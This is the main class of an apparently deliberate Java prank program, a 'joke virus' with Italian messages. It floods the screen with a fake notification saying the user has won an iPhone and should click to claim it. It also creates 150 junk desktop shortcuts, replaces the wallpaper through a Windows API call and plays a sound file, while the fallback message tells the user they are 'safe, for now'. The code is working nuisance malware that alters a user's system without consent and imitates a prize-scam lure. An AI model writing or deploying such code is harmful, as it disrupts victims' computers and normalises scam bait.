import java.awt.*;
import java.io.File;
import java.io.IOException;

public class Main {
    public static String resources = new File("").getAbsolutePath() + "\\src\\resources";

    public static void main(String[] args) {
        boolean execute;

        if("11".compareTo(System.getProperty("java.version")) <= 0) {
            System.out.println("Versione di Java supportata. Attuale: " + System.getProperty("java.version"));
            execute = true;
        } else {
            Exception e = new Exception("Versione di Java non supportata. Utilizzare almeno la 11 (la 19 Ã¨ quella consigliata). Attuale: " + System.getProperty("java.version"));
            e.printStackTrace();
            execute = false;
        }

        if(execute) {
            Notifica notifica = new Notifica(
                    resources + "\\notification\\icon.png",
                    "Sei un fortunato vincitore!",
                    "Hai vinto un iPhone 14 Pro Max. Clicca la notifica per ottenerlo"
            );

            Thread thread = new Thread(() -> {
                for(int i=0; i<40; i++) {
                    try {
                        notifica.mostraNotifica();
                    } catch (AWTException e) {
                        e.printStackTrace();
                    }
                }
            });
            thread.start();

            for(int i=0; i<150; i++) {
                try{
                    Shortcut.creaShortcut(
                            "END" + i,
                            resources + "\\redir\\END.txt",
                            resources + "\\redir\\END.ico");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

            User32.INSTANCE.SystemParametersInfo(0x0014, 0, resources + "\\background\\bg.jpg" , 1);

            Caccia.creaCaccia(resources + "\\wav\\caccia.wav");
        } else {
            System.out.println("Sei salvo, per ora.");
        }
    }
}